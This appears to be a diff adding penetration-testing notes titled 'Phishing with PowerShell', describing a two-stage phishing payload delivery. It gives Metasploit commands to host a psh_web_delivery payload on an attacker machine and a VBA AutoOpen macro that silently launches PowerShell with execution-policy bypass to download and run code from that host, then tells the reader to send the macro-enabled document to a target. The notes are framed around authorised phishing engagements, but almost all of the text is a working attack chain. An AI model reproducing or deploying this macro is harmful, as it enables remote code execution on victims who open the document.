@@ -1,0 +1,32 @@
+##########################
+#Phishing with PowerShell#
+##########################
+
+Reference:
+http://securitypadawan.blogspot.com/2014/01/phishing-with-powershell.html
+http://www.rapid7.com/db/modules/exploit/windows/misc/psh_web_delivery
+
+I have seen quite a few tweets/comments/etc about using Powershell's functionality within the context of a Microsoft Office document/VBA (https://github.com/enigma0x3/Powershell-Payload-Excel-Delivery/blob/master/MacroCode). I am going to share a way I have been leveraging Powershell for payload delivery during phishing engagements for a while now to achieve the same end result in a much simpler fashion. The two stages are as follows:
+
+Attacker Machine:
+msf > use exploit/windows/misc/psh_web_delivery
+msf exploit(psh_web_delivery) > set SRVHOST Strategic-Sec-Ubuntu-VM-IP
+msf exploit(psh_web_delivery) > set URIPATH boom
+msf exploit(psh_web_delivery) > exploit
+
+VBA Macro:
+Sub AutoOpen()
+
+    Call Shell("powershell.exe -w hidden -nop -ep bypass -c ""IEX ((new-object net.webclient).downloadstring('http://Strategic-Sec-Ubuntu-VM-IP:8080/boom'))""", 1)
+End Sub
+
+Save the document as a macro-enabled file.
+Send to target, and upon opening....
+
+
+
+
+
+
+Meanwhile back at the bat cave...
+
